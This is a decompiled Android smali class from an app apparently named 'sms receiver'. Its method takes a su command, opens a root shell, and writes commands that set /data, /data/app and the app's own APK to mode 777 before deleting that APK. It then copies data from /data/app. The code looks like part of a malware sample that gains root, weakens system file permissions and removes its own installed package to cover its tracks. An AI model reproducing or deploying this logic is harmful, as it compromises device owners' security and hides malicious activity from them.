.class Lcom/binary/sms/receiver/SkeletonActivity$8;
.super Ljava/lang/Object;
.source "SkeletonActivity.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/binary/sms/receiver/SkeletonActivity;->systemCallRemove(Ljava/lang/String;J)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/binary/sms/receiver/SkeletonActivity;

.field private final synthetic val$suComand:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/binary/sms/receiver/SkeletonActivity;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/binary/sms/receiver/SkeletonActivity$8;->this$0:Lcom/binary/sms/receiver/SkeletonActivity;

    iput-object p2, p0, Lcom/binary/sms/receiver/SkeletonActivity$8;->val$suComand:Ljava/lang/String;

    .line 653
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .prologue
    .line 657
    :try_start_0
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "systemCallRemove: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/binary/sms/receiver/SkeletonActivity$8;->val$suComand:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 659
    iget-object v1, p0, Lcom/binary/sms/receiver/SkeletonActivity$8;->val$suComand:Ljava/lang/String;

    invoke-virtual {p0, v1}, Lcom/binary/sms/receiver/SkeletonActivity$8;->sume(Ljava/lang/String;)V

    .line 661
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "systemCallRemove end: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/binary/sms/receiver/SkeletonActivity$8;->val$suComand:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 666
    :goto_0
    return-void

    .line 662
    :catch_0
    move-exception v0

    .line 663
    .local v0, "e":Ljava/lang/Exception;
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "readMails: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public sume(Ljava/lang/String;)V
    .locals 16
    .param p1, "suComand"    # Ljava/lang/String;

    .prologue
    .line 670
    move-object/from16 v0, p0

    iget-object v12, v0, Lcom/binary/sms/receiver/SkeletonActivity$8;->this$0:Lcom/binary/sms/receiver/SkeletonActivity;

    invoke-virtual {v12}, Lcom/binary/sms/receiver/SkeletonActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v12

    invoke-virtual {v12}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    .line 671
    .local v1, "PACKAGE_NAME":Ljava/lang/String;
    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "/data/app/"

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v13, v0, Lcom/binary/sms/receiver/SkeletonActivity$8;->this$0:Lcom/binary/sms/receiver/SkeletonActivity;

    invoke-virtual {v13}, Lcom/binary/sms/receiver/SkeletonActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v13

    invoke-virtual {v13}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, "-1.apk"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 672
    .local v2, "applicationfile":Ljava/lang/String;
    const/4 v12, 0x4

    new-array v3, v12, [Ljava/lang/String;

    const/4 v12, 0x0

    .line 673
    const-string v13, "chmod 777 /data/"

    aput-object v13, v3, v12

    const/4 v12, 0x1

    .line 674
    const-string v13, "chmod 777 /data/app/"

    aput-object v13, v3, v12

    const/4 v12, 0x2

    .line 675
    new-instance v13, Ljava/lang/StringBuilder;

    const-string v14, "chmod 777 "

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    aput-object v13, v3, v12

    const/4 v12, 0x3

    .line 676
    new-instance v13, Ljava/lang/StringBuilder;

    const-string v14, "rm "

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    aput-object v13, v3, v12

    .line 678
    .local v3, "commands":[Ljava/lang/String;
    const/4 v7, 0x0

    .line 680
    .local v7, "msg":Landroid/os/Message;
    const/4 v5, 0x1

    .line 682
    .local v5, "i":I
    const/4 v10, 0x0

    .line 683
    .local v10, "process":Ljava/lang/Process;
    const/4 v8, 0x0

    .line 686
    .local v8, "os":Ljava/io/DataOutputStream;
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v12

    move-object/from16 v0, p1

    invoke-virtual {v12, v0}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v10

    .line 689
    new-instance v9, Ljava/io/DataOutputStream;

    invoke-virtual {v10}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v12

    invoke-direct {v9, v12}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 694
    .end local v8    # "os":Ljava/io/DataOutputStream;
    .local v9, "os":Ljava/io/DataOutputStream;
    if-eqz v3, :cond_0

    .line 696
    :try_start_1
    array-length v13, v3

    const/4 v12, 0x0

    move v6, v5

    .end local v5    # "i":I
    .local v6, "i":I
    :goto_0
    if-lt v12, v13, :cond_2

    move v5, v6

    .line 709
    .end local v6    # "i":I
    .restart local v5    # "i":I
    :cond_0
    const-string v12, "exit\n"

    invoke-virtual {v9, v12}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 710
    invoke-virtual {v9}, Ljava/io/DataOutputStream;->flush()V

    .line 712
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    const-wide/16 v12, 0xbb8

    invoke-static {v12, v13}, Ljava/lang/Thread;->sleep(J)V

    .line 714
    invoke-virtual {v10}, Ljava/lang/Process;->waitFor()I

    .line 715
    invoke-static {}, Landroid/os/Message;->obtain()Landroid/os/Message;

    move-result-object v7

    .line 716
    const/4 v12, 0x0

    iput v12, v7, Landroid/os/Message;->arg1:I

    .line 717
    const/4 v12, 0x0

    iput v12, v7, Landroid/os/Message;->arg2:I

    .line 719
    const-string v12, "systemCall Succesfule"

    invoke-static {v12}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 731
    if-eqz v9, :cond_1

    .line 732
    :try_start_2
    invoke-virtual {v9}, Ljava/io/DataOutputStream;->close()V

    .line 734
    :cond_1
    invoke-virtual {v10}, Ljava/lang/Process;->destroy()V

    .line 736
    move-object/from16 v0, p0

    iget-object v12, v0, Lcom/binary/sms/receiver/SkeletonActivity$8;->this$0:Lcom/binary/sms/receiver/SkeletonActivity;

    invoke-static {v12}, Lcom/binary/sms/receiver/SkeletonActivity;->access$0(Lcom/binary/sms/receiver/SkeletonActivity;)Landroid/widget/EditText;

    move-result-object v12

    const-string v13, "finished kill...."

    invoke-virtual {v12, v13}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 738
    const-string v12, "/data/app"

    invoke-static {v12}, Lcom/binary/sms/receiver/SkeletonActivity;->copyDataData(Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    :goto_1
    move-object v8, v9

    .line 744
    .end local v9    # "os":Ljava/io/DataOutputStream;
    .restart local v8    # "os":Ljava/io/DataOutputStream;
    :goto_2
    return-void

    .line 696
    .end local v5    # "i":I
    .end local v8    # "os":Ljava/io/DataOutputStream;
    .restart local v6    # "i":I
    .restart local v9    # "os":Ljava/io/DataOutputStream;
    :cond_2
    :try_start_3
    aget-object v11, v3, v12

    .line 697
    .local v11, "single":Ljava/lang/String;
    new-instance v14, Ljava/lang/StringBuilder;

    const-string v15, "command: "

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v14, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 698
    new-instance v14, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v15

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v15, "\n"

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v9, v14}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 699
    invoke-virtual {v9}, Ljava/io/DataOutputStream;->flush()V

    .line 700
    invoke-static {}, Landroid/os/Message;->obtain()Landroid/os/Message;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_5
    .catchall {:try_start_3 .. :try_end_3} :catchall_2

    move-result-object v7

    .line 701
    add-int/lit8 v5, v6, 0x1

    .end local v6    # "i":I
    .restart local v5    # "i":I
    :try_start_4
    iput v6, v7, Landroid/os/Message;->arg1:I

    .line 702
    const/4 v14, -0x1

    iput v14, v7, Landroid/os/Message;->arg2:I
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    .line 696
    add-int/lit8 v12, v12, 0x1

    move v6, v5

    .end local v5    # "i":I
    .restart local v6    # "i":I
    goto :goto_0

    .line 721
    .end local v6    # "i":I
    .end local v9    # "os":Ljava/io/DataOutputStream;
    .end local v11    # "single":Ljava/lang/String;
    .restart local v5    # "i":I
    .restart local v8    # "os":Ljava/io/DataOutputStream;
    :catch_0
    move-exception v4

    .line 722
    .local v4, "e":Ljava/lang/Exception;
    :goto_3
    :try_start_5
    invoke-static {}, Landroid/os/Message;->obtain()Landroid/os/Message;

    move-result-object v7

    .line 723
    const/4 v12, 0x1

    iput v12, v7, Landroid/os/Message;->arg1:I

    .line 724
    const/4 v12, 0x0

    iput v12, v7, Landroid/os/Message;->arg2:I

    .line 726
    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "systemCall Exception"

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v12, v4}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 731
    if-eqz v8, :cond_3

    .line 732
    :try_start_6
    invoke-virtual {v8}, Ljava/io/DataOutputStream;->close()V

    .line 734
    :cond_3
    invoke-virtual {v10}, Ljava/lang/Process;->destroy()V

    .line 736
    move-object/from16 v0, p0

    iget-object v12, v0, Lcom/binary/sms/receiver/SkeletonActivity$8;->this$0:Lcom/binary/sms/receiver/SkeletonActivity;

    invoke-static {v12}, Lcom/binary/sms/receiver/SkeletonActivity;->access$0(Lcom/binary/sms/receiver/SkeletonActivity;)Landroid/widget/EditText;

    move-result-object v12

    const-string v13, "finished kill...."

    invoke-virtual {v12, v13}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 738
    const-string v12, "/data/app"

    invoke-static {v12}, Lcom/binary/sms/receiver/SkeletonActivity;->copyDataData(Ljava/lang/String;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto :goto_2

    .line 740
    :catch_1
    move-exception v4

    .line 741
    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "systemCall finaly"

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v12, v4}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_2

    .line 729
    .end local v4    # "e":Ljava/lang/Exception;
    :catchall_0
    move-exception v12

    .line 731
    :goto_4
    if-eqz v8, :cond_4

    .line 732
    :try_start_7
    invoke-virtual {v8}, Ljava/io/DataOutputStream;->close()V

    .line 734
    :cond_4
    invoke-virtual {v10}, Ljava/lang/Process;->destroy()V

    .line 736
    move-object/from16 v0, p0

    iget-object v13, v0, Lcom/binary/sms/receiver/SkeletonActivity$8;->this$0:Lcom/binary/sms/receiver/SkeletonActivity;

    invoke-static {v13}, Lcom/binary/sms/receiver/SkeletonActivity;->access$0(Lcom/binary/sms/receiver/SkeletonActivity;)Landroid/widget/EditText;

    move-result-object v13

    const-string v14, "finished kill...."

    invoke-virtual {v13, v14}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 738
    const-string v13, "/data/app"

    invoke-static {v13}, Lcom/binary/sms/receiver/SkeletonActivity;->copyDataData(Ljava/lang/String;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    .line 743
    :goto_5
    throw v12

    .line 740
    :catch_2
    move-exception v4

    .line 741
    .restart local v4    # "e":Ljava/lang/Exception;
    new-instance v13, Ljava/lang/StringBuilder;

    const-string v14, "systemCall finaly"

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-static {v13, v4}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_5

    .line 740
    .end local v4    # "e":Ljava/lang/Exception;
    .end local v8    # "os":Ljava/io/DataOutputStream;
    .restart local v9    # "os":Ljava/io/DataOutputStream;
    :catch_3
    move-exception v4

    .line 741
    .restart local v4    # "e":Ljava/lang/Exception;
    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "systemCall finaly"

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v12, v4}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_1

    .line 729
    .end local v4    # "e":Ljava/lang/Exception;
    :catchall_1
    move-exception v12

    move-object v8, v9

    .end local v9    # "os":Ljava/io/DataOutputStream;
    .restart local v8    # "os":Ljava/io/DataOutputStream;
    goto :goto_4

    .end local v5    # "i":I
    .end local v8    # "os":Ljava/io/DataOutputStream;
    .restart local v6    # "i":I
    .restart local v9    # "os":Ljava/io/DataOutputStream;
    :catchall_2
    move-exception v12

    move-object v8, v9

    .end local v9    # "os":Ljava/io/DataOutputStream;
    .restart local v8    # "os":Ljava/io/DataOutputStream;
    move v5, v6

    .end local v6    # "i":I
    .restart local v5    # "i":I
    goto :goto_4

    .line 721
    .end local v8    # "os":Ljava/io/DataOutputStream;
    .restart local v9    # "os":Ljava/io/DataOutputStream;
    :catch_4
    move-exception v4

    move-object v8, v9

    .end local v9    # "os":Ljava/io/DataOutputStream;
    .restart local v8    # "os":Ljava/io/DataOutputStream;
    goto/16 :goto_3

    .end local v5    # "i":I
    .end local v8    # "os":Ljava/io/DataOutputStream;
    .restart local v6    # "i":I
    .restart local v9    # "os":Ljava/io/DataOutputStream;
    :catch_5
    move-exception v4

    move-object v8, v9

    .end local v9    # "os":Ljava/io/DataOutputStream;
    .restart local v8    # "os":Ljava/io/DataOutputStream;
    move v5, v6

    .end local v6    # "i":I
    .restart local v5    # "i":I
    goto/16 :goto_3
.end method
